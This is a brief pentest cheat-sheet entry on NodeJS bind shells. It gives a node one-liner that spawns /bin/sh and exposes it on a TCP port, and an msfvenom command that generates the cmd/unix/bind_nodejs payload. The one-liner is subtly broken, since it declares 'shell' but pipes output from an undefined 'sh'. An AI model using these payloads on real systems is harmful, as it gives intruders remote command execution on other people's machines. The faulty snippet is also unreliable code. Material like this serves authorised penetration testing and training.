# NodeJS

## 01 - One-liners

```javascript
node -e 'shell = require("child_process").spawn("/bin/sh");
require("net").createServer(function (client) {
  client.pipe(shell.stdin);
  sh.stdout.pipe(client);
  sh.stderr.pipe(client);
}).listen(process.env.<PORT>)'
```

## 02 - Generate a payload via `msfvenom`

```
$ msfvenom -p cmd/unix/bind_nodejs lport=<PORT>
```

---
## References

### GTFOBins

- [GTFOBins: NodeJS]